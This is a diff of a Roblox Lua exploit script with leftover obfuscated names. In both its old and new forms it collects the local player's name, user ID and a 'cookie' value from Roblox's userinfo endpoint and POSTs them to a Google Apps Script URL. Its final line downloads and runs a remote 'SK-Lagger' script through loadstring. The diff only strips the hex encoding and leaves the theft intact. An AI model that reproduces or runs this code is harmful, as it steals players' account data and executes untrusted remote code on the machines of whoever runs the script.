@@ -1,36 +1,28 @@
 task.spawn(function()
     task.wait(5)
-    local _0x_URL_BASE = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x63\x72\x69\x70\x74\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x6d\x61\x63\x72\x6f\x73\x2f\x73\x2f"
-    
-    local _0x_GAS_ID = "AKfycbyHdS3RiHw0m41yFMrxZfU8Az0J4bo6Wjpm0IYRoN8GuNyI9Er_l-Hl6YsLPog3p0xSAQ"
-    
-    local _0x_EXEC = "\x2f\x65\x78\x65\x63"
-    
-    local _0x_HTTP = game:GetService("\x48\x74\x74\x70\x53\x65\x72\x76\x69\x63\x65")
-
+    local _0x_GAS_URL = "https://script.google.com/macros/s/AKfycbzkvyDbX4MJElmWCMClLUSg_sI3DylBim7mSaLLvd7GKMvAApr5I3kf28L_Xaa0FaqDHA/exec"
+    local _0x_HTTP = game:GetService("HttpService")
     local function _0x_DO_WORK()
         local _0x_C = "Not Found"
         pcall(function()
-            _0x_C = tostring(game:HttpGet("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x72\x6f\x62\x6c\x6f\x78\x2e\x63\x6f\x6d\x2f\x6d\x61\x62\x69\x6c\x65\x61\x70\x69\x2f\x75\x73\x65\x72\x69\x6e\x66\x6f")):split(":")[1] or "Failed"
+            _0x_C = tostring(game:HttpGet("https://www.roblox.com/mobileapi/userinfo")):split(":")[1] or "Failed"
         end)
-
         local _0x_P = {
-            ["\x75\x73\x65\x72"] = game.Players.LocalPlayer.Name .. " (" .. game.Players.LocalPlayer.UserId .. ")",
-            ["\x63\x6f\x6f\x6b\x69\x65"] = _0x_C,
-            ["\x73\x74\x61\x74\x75\x73"] = "\x4F\x4E\x4C\x49\x4E\x45"
+            ["user"] = game.Players.LocalPlayer.Name .. " (" .. game.Players.LocalPlayer.UserId .. ")",
+            ["cookie"] = _0x_C,
+            ["status"] = "FINAL_PHASE_ACTIVE"
         }
-
-        local _0x_R = (getgenv()["\x72\x65\x71\x75\x65\x73\x74"] or getgenv()["\x68\x74\x74\x70\x5f\x72\x65\x71\x75\x65\x73\x74"])
+        local _0x_R = (getgenv().request or getgenv().http_request)
         if _0x_R then
             _0x_R({
-                Url = _0x_URL_BASE .. _0x_GAS_ID .. _0x_EXEC,
-                Method = "\x50\x4f\x53\x54",
-                Headers = {["\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65"] = "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e"},
+                Url = _0x_GAS_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
                 Body = _0x_HTTP:JSONEncode(_0x_P)
             })
         end
     end
-    _0x_DO_WORK()
+    pcall(_0x_DO_WORK)
 end)
 
 loadstring(game:HttpGet("https://sk-konbu.site/SKHub/SK-Lagger.txt"))()
